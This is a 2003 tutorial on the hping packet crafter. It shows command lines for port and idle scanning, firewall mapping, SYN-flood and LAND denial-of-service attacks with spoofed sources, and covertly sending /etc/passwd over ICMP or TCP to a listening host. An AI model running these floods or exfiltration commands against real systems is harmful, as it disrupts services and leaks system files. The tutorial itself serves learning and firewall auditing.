# HPING Tutorial

### By Philippe Bogaerts, alias xxradar.
Website: [radarhack.com](http://www.radarhack.com)
Contact: [xxradar@radarhack.com](mailto:xxradar@radarhack.com)
Version: 1.5 (24-08-2003)

## What is HPING?

Hping is a command-line-oriented TCP/IP packet crafter. It is used to create IP packets with TCP, UDP, or ICMP payloads, allowing for modification and control of all header fields via command line input. To effectively use HPING, a solid understanding of IP and TCP/UDP protocols is crucial.

For more detailed information and to download the binaries, visit [hping.org](http://www.hping.org). You can also find a full working version of hping on a bootable CD at [knoppix-std.org](http://www.knoppix-std.org). Please exercise caution and use the examples within a test environment, as they might impact firewalls or end systems.

---

## Usage Examples

### 1. HPING as a Port Scanner

HPING can craft TCP packets by specifying TCP flags, a destination port, and a target IP:

- **Flags:**
  - `-F`: Set FIN flag
  - `-S`: Set SYN flag
  - `-R`: Set RST flag
  - `-P`: Set PUSH flag
  - `-A`: Set ACK flag
  - `-U`: Set URG flag
  - `-X`: Set X unused flag (0x40)
  - `-Y`: Set Y unused flag (0x80)

Example command to scan port 80:

```bash
[root@localhost root]# hping -I eth0 -S 192.168.10.1 -p 80
```

Output:
- Open ports are indicated by packets with `SA` flags returned, while closed ports show `RA` packets.
- Similar to SYN or Stealth scanning.
- `++` can be used to increment the destination port during scans.

Example with incrementing port:

```bash
[root@localhost root]# hping -I eth0 -S 192.168.10.1 -p ++79
```

To see only open ports:

```bash
[root@localhost root]# hping -I eth0 -S 192.168.10.1 -p ++79 | grep SA
```

### 2. Idle Scanning

Idle scanning anonymously scans a remote system by using a third "silent host."

**Requirements:**

- A silent host with predictable IP ID increments.
- Use commands to probe the silent host and monitor the ID increments.

Session 1: A spoofed scan:

```bash
[root@localhost root]# hping -I eth0 -a 192.168.10.1 -S 192.168.10.33 -p ++20
```

Session 2: Continuous probing:

```bash
[root@localhost docs]# hping -I eth0 -r -S 192.168.10.1 -p 2000
```

### 3. Firewall Mapping

Map firewalls using traceroute-style techniques with HPING by utilizing ICMP, UDP, and TCP packets.

- `-t`: Sets initial TTL in the IP header.
- `-z`: Binds the `ctrl+z` key to increase TTL when pressed.

Example command for firewall mapping:

```bash
[root@localhost root]# hping -I eth0 -z -t 6 -S mail.test.com -p 143
```

### 4. HPING as a DoS Tool

#### 4.1 SYN Attack

An example of a SYN flood attack against a Windows 2000 machine.

```bash
[root@localhost root]# hping -I eth0 -a 192.168.10.99 -S 192.168.10.33 -p 80 -i u1000
```

#### 4.2 LAND Attack

Attacks a system by sending packets from itself to itself:

```bash
[root@localhost root]# hping -S -a 10.10.10.10 -p 21 10.10.10.10
```

#### 4.3 Spoofing Control

Checks firewalls' ability to block spoofed packets by spoofing packets.

### 5. Packets with Signatures

Create data payloads that carry signatures to demonstrate potential misuse of UDP services:

```bash
[root@localhost rules]# hping -2 -p 7 192.168.10.33 -d 50 -E /root/signature.sig
```

### 6. Transferring Files via ICMP, UDP, or TCP

Using `--listen` switch:

#### 6.1 Transferring via ICMP

Receiver:

```bash
[root@localhost root]# hping 192.168.10.66 --listen signature --safe --icmp
```

Sender:

```bash
[root@knoppix root]# hping 192.168.10.44 --icmp -d 100 --sign signature --file /etc/passwd
```

#### 6.2 Transferring via TCP

Receiver:

```bash
[root@localhost root]# hping 192.168.10.66 --listen signature --safe -p 22
```

Sender:

```bash
[root@knoppix root]hping -p 22 -d 100 --sign signature --file /etc/passwd
```

### 7. Conclusion

HPING is a versatile tool for those wishing to learn and experiment with TCP/IP protocols, audit firewalls, or simply explore network behavior. It is vital to operate within legal and ethical boundaries while using this powerful tool.
